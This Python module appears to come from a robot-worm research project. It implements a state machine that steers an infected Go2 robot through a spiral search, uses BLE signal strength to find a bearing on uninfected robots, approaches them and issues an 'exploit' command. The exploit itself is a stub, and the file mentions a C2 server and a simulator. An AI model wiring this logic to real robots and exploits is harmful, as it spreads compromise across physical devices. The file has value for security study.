"""
Hunt state machine - autonomous robot-to-robot physical pursuit.

This is the most novel component of UniRoam: using an infected robot's
mobility to physically hunt and infect other robots.  The state machine
drives an infected Go2 via DimOS to search for, approach, and exploit
nearby uninfected robots using BLE signal strength (RSSI) as guidance.

Architecture:
  - The infected Go2 runs a BLE scanner that reports discovered devices
    and their RSSI values to the C2 server.
  - This hunt orchestrator (running on an operator machine or the C2
    itself) reads those scan results and issues movement commands back
    to the infected Go2 via a robot control API (DimOS).
  - The robot physically moves through space in a search pattern,
    uses RSSI gradient to determine bearing to the target, approaches
    until in BLE range, then fires the exploit.

The search strategy uses an expanding square spiral pattern, which
provides systematic area coverage without revisiting locations.

This module contains the state machine logic only - no exploit code,
no robot control API calls, no BLE operations.
"""

import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional, List

logger = logging.getLogger("uniroam.hunt")


class HuntState(Enum):
    IDLE = "IDLE"
    SEARCHING = "SEARCHING"       # Expanding square spiral, scanning BLE
    DETECTED = "DETECTED"         # Target seen, preparing bearing sweep
    BEARING = "BEARING"           # 360-degree rotation to find strongest RSSI
    APPROACHING = "APPROACHING"   # Moving toward target, tracking RSSI
    IN_RANGE = "IN_RANGE"         # Close enough for BLE exploit
    INFECTING = "INFECTING"       # Running exploit chain
    COMPLETE = "COMPLETE"         # Target infected, ready for next


# RSSI thresholds (dBm) - calibrated on Go2 hardware
RSSI_DETECTION = -85    # First detect: target exists somewhere nearby
RSSI_GOOD = -70         # Well-detected: bearing sweep is reliable
RSSI_IN_RANGE = -60     # Close enough for BLE exploit (~5m typical)
RSSI_LOST = -90         # Signal too weak: restart bearing sweep


@dataclass
class HuntTarget:
    address: str
    name: str
    best_rssi: int = -100
    best_bearing: float = 0.0     # Degrees, robot-relative
    last_seen: float = 0.0


@dataclass
class SearchPattern:
    """Expanding square spiral for systematic area coverage.

    Starting from the current position, the robot walks increasingly
    long legs in a square spiral:
      - Leg 1: 3m north
      - Leg 2: 3m east
      - Leg 3: 6m south
      - Leg 4: 6m west
      - Leg 5: 9m north
      - ...

    At each waypoint, the robot pauses for BLE scanning.  If a target
    is detected, the state machine transitions to BEARING.
    """
    step_base_m: float = 3.0
    step_inc_m: float = 3.0
    current_leg: int = 0
    current_step: int = 0
    waypoint_dwell_s: float = 4.0

    def next_waypoint(self) -> tuple[float, float]:
        """Return (distance_m, heading_degrees) for the next waypoint."""
        ring = self.current_leg // 2
        leg_length = self.step_base_m + (ring * self.step_inc_m)
        headings = [0, 90, 180, 270]  # N, E, S, W
        heading = headings[self.current_leg % 4]

        self.current_step += 1
        # Advance to next leg after completing current one
        steps_per_leg = max(1, int(leg_length / self.step_base_m))
        if self.current_step >= steps_per_leg:
            self.current_leg += 1
            self.current_step = 0

        return leg_length / steps_per_leg, heading


@dataclass
class BearingSweep:
    """360-degree rotation to find the direction of strongest RSSI.

    The robot rotates in place, taking RSSI readings at each step.
    After a full rotation, the bearing with the strongest signal is
    selected as the approach direction.
    """
    steps: int = 12                # 30 degrees per step
    dwell_s: float = 2.5           # Pause at each step for RSSI to stabilize
    readings: List[tuple[float, int]] = field(default_factory=list)

    def step_degrees(self) -> float:
        return 360.0 / self.steps

    def best_bearing(self) -> Optional[float]:
        if not self.readings:
            return None
        return max(self.readings, key=lambda r: r[1])[0]


class HuntStateMachine:
    """Autonomous hunt controller.

    This class implements the state transitions.  In the production
    system, the `move_robot` and `scan_ble` callbacks were connected
    to the DimOS API and the C2's BLE scan results endpoint.

    Here they are abstract methods that can be connected to the
    virtual simulator for demonstration.
    """

    def __init__(self):
        self.state = HuntState.IDLE
        self.target: Optional[HuntTarget] = None
        self.search = SearchPattern()
        self.bearing = BearingSweep()

    def transition(self, new_state: HuntState):
        logger.info("Hunt: %s -> %s", self.state.value, new_state.value)
        self.state = new_state

    def on_ble_scan_result(self, address: str, name: str, rssi: int):
        """Process a BLE scan result from the infected robot."""

        if self.state == HuntState.IDLE:
            return

        if self.state == HuntState.SEARCHING:
            if rssi > RSSI_DETECTION:
                self.target = HuntTarget(address=address, name=name, best_rssi=rssi)
                logger.info("Target detected: %s (RSSI %d)", name, rssi)
                self.transition(HuntState.DETECTED)

        elif self.state == HuntState.BEARING:
            if self.target and address == self.target.address:
                current_bearing = len(self.bearing.readings) * self.bearing.step_degrees()
                self.bearing.readings.append((current_bearing, rssi))
                if rssi > self.target.best_rssi:
                    self.target.best_rssi = rssi
                    self.target.best_bearing = current_bearing

        elif self.state == HuntState.APPROACHING:
            if self.target and address == self.target.address:
                self.target.best_rssi = rssi
                if rssi >= RSSI_IN_RANGE:
                    logger.info("Target in BLE range (RSSI %d) - ready to exploit", rssi)
                    self.transition(HuntState.IN_RANGE)
                elif rssi < RSSI_LOST:
                    logger.warning("Lost target signal - restarting bearing sweep")
                    self.bearing = BearingSweep()
                    self.transition(HuntState.DETECTED)

    def tick(self) -> Optional[dict]:
        """Advance the state machine by one step.

        Returns a command dict for the robot controller, or None.
        Commands: {"action": "move", "distance_m": ..., "heading_deg": ...}
                  {"action": "rotate", "degrees": ...}
                  {"action": "exploit", "target": ...}
                  {"action": "wait", "seconds": ...}
        """
        if self.state == HuntState.IDLE:
            return None

        if self.state == HuntState.SEARCHING:
            dist, heading = self.search.next_waypoint()
            return {"action": "move", "distance_m": dist, "heading_deg": heading}

        if self.state == HuntState.DETECTED:
            self.bearing = BearingSweep()
            self.transition(HuntState.BEARING)
            return {"action": "rotate", "degrees": self.bearing.step_degrees()}

        if self.state == HuntState.BEARING:
            if len(self.bearing.readings) >= self.bearing.steps:
                best = self.bearing.best_bearing()
                if best is not None:
                    logger.info("Bearing sweep complete - best at %.0f deg", best)
                    self.target.best_bearing = best
                    self.transition(HuntState.APPROACHING)
                    return {"action": "rotate", "degrees": best}
                else:
                    logger.warning("No signal during bearing sweep - resuming search")
                    self.transition(HuntState.SEARCHING)
                    return None
            return {"action": "rotate", "degrees": self.bearing.step_degrees()}

        if self.state == HuntState.APPROACHING:
            return {"action": "move", "distance_m": 5.0,
                    "heading_deg": self.target.best_bearing}

        if self.state == HuntState.IN_RANGE:
            self.transition(HuntState.INFECTING)
            return {"action": "exploit", "target": self.target.address}

        if self.state == HuntState.INFECTING:
            # Exploit stub runs here - in sim, instant success
            self.transition(HuntState.COMPLETE)
            return None

        return None

    def start_hunt(self):
        self.search = SearchPattern()
        self.transition(HuntState.SEARCHING)

    def reset(self):
        self.state = HuntState.IDLE
        self.target = None
        self.search = SearchPattern()
        self.bearing = BearingSweep()
